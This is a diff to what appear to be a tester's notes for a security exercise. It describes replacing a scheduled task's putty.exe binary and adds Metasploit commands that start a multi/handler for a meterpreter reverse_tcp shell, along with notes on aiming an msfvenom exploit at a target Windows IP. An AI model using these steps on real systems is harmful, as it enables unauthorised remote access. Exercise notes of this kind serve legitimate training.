@@ -860,4 +860,28 @@ CHECK SCHTASKS ON WINDOWS FOR ANY INTERSTING
 - look for any more suspicious schtasks and check the actions page to see what is happening on the machine (putty)
 - create a new version of C:\users\lroth\temp\putty.exe and name the previous one to putty.old 
 
+CREATE A MULTI/HANDLER WITH SECURESERVERBUFFER 
+msfconsole
+use multi/handler 
+set payload windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+
+change the IP for the LIN-OPS IP on Gameday for the msfvenom exploit and change the s.connect to the <Target Windows IP> and Port <9999>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
